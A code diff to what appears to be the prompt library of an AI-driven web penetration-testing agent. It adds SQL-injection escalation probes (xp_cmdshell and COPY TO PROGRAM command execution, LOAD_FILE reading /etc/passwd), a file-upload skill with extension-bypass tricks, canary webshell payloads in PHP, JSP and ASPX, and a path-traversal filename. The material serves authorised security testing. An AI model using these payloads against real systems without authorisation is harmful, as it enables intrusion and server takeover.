@@ -357,7 +357,13 @@ Time-blind: MySQL `' AND SLEEP(5)--` | MSSQL `'; WAITFOR DELAY '0:0:5'--` |
   PostgreSQL `'; SELECT pg_sleep(5)--` — confirm with baseline timing.
 UNION: find column count with `' ORDER BY N--`; find reflected column with
   `' UNION SELECT NULL,NULL,'x',NULL--`; extract `' UNION SELECT NULL,@@version--`.
-Constraint: never DROP/INSERT/UPDATE/DELETE; limit to version/DB name for PoC.""",
+Post-confirmation escalation (after injection is proven — read-only, no PII bulk dump):
+  DB user identity: `UNION SELECT current_user--` (MySQL/PSQL) | `SELECT SYSTEM_USER` (MSSQL)
+  Table enumeration (names only): `UNION SELECT table_name FROM information_schema.tables--`
+  MSSQL RCE probe: `; EXEC xp_cmdshell 'echo aespa_rce_probe'--` → CRITICAL if output returned
+  MySQL file-read: `UNION SELECT LOAD_FILE('/etc/passwd'),NULL--` → High if content returned
+  PostgreSQL OS exec: `; COPY (SELECT 1) TO PROGRAM 'echo aespa_rce_probe'--` → CRITICAL if confirmed
+Constraint: never DROP/INSERT/UPDATE/DELETE; read-only escalation probes only; no bulk PII dump.""",
 
     "xss": r"""─── XSS (WSTG-INPV-01/02) ──────────────────────────────────────────────────────
 Step 0 — check for pre-identified sinks: call context_tool with tool="target_inventory"
@@ -459,6 +465,25 @@ Step skipping: jump directly to the final confirmation/submit step without compl
 Parameter tampering: modify hidden `step=3`, `status=approved`, `verified=true` fields.
 Price/quantity manipulation: change `price=0.01`, `qty=-1`, modify discount values in POST body.
 Race conditions: send the same state-changing request twice simultaneously.""",
+
+    "file_upload": r"""─── UNRESTRICTED FILE UPLOAD (WSTG-UPLD-01) ─────────────────────────────────────
+Goal: achieve RCE by uploading and executing a server-side script via an unrestricted upload endpoint.
+Step 1 — baseline: upload a harmless .txt file; note stored URL from response.
+Step 2 — direct extension upload: try .php .php3 .php4 .php5 .phtml .phar .jsp .jspx .aspx .asp
+Step 3 — extension bypass (if filtered):
+  Mixed case:       shell.PHP | shell.Php
+  Double extension: shell.php.jpg | shell.jpg.php
+  Trailing dot:     shell.php.  (Windows IIS)
+  Null-byte:        shell.php%00.jpg  (legacy servers)
+  Alternate:        .phtml | .php5 | .phar | .shtml
+Step 4 — content-type bypass: upload .php file with Content-Type: image/jpeg
+Step 5 — canary webshell payloads:
+  PHP:  <?php echo 'aespa_rce_' . php_uname(); ?>
+  JSP:  <% out.println("aespa_rce_" + System.getProperty("os.name")); %>
+  ASPX: <%@ Page Language="C#" %><% Response.Write("aespa_rce_" + Environment.OSVersion); %>
+Step 6 — fetch stored URL; if aespa_rce_ appears in response body → CRITICAL RCE finding.
+Step 7 — if file stored but not executed: try path traversal in filename: ../../webroot/shell.php
+Severity: CRITICAL if RCE confirmed; HIGH if dangerous extension stored but not executed.""",
 }
 
 # SSRF-indicative parameter names used by the WSTG skill selector.
@@ -478,7 +503,7 @@ _AUTH_PATH_FRAGMENTS: frozenset[str] = frozenset({
 
 _SKILL_ORDER = (
     "sqli", "xss", "cmdi", "ssrf", "idor", "auth_bypass",
-    "csrf", "sessions", "cors", "headers", "workflow",
+    "csrf", "sessions", "cors", "headers", "workflow", "file_upload",
 )
 
 
@@ -510,13 +535,16 @@ _THINKING_AGENT_SYSTEM = (
     "as you have concrete evidence of a testable vector — e.g. a confirmed stored-XSS sink "
     "with a verified injection point, an IDOR primitive where you can enumerate a foreign "
     "object ID, an auth bypass with a reproducible proof, a SQLi indicator with a "
-    "distinctive error or timing response, or an SSRF-prone parameter (url=, webhook=, "
-    "redirect=, callback=, src=, fetch=, imageurl=, etc.) on an API endpoint. "
+    "distinctive error or timing response, an SSRF-prone parameter (url=, webhook=, "
+    "redirect=, callback=, src=, fetch=, imageurl=, etc.) on an API endpoint, or a file "
+    "upload endpoint that accepts user-supplied files (multipart/form-data or binary). "
     "For SSRF, dispatch on parameter discovery alone — no prior server-side confirmation "
-    "is needed. Set priority 7–10 for other classes; use priority 5–7 for SSRF based on "
+    "is needed. For file_upload, dispatch as soon as an upload endpoint is confirmed — do "
+    "not wait to test extensions yourself. "
+    "Set priority 7–10 for other classes; use priority 5–7 for SSRF based on "
     "how many SSRF-prone parameters were found. "
     "Attack classes: idor, auth_bypass, sqli, xss, business_logic, ssrf, path_traversal, "
-    "cors, crypto, config. Dispatch immediately — do NOT keep probing the same lead "
+    "cors, crypto, config, file_upload. Dispatch immediately — do NOT keep probing the same lead "
     "yourself after dispatching.\n"
     "- done: end the assessment when all areas are covered and it is unlikely further vulnerabilities will be found.\n"
     "- Confirmed findings are CLOSED — do not re-probe them.\n"
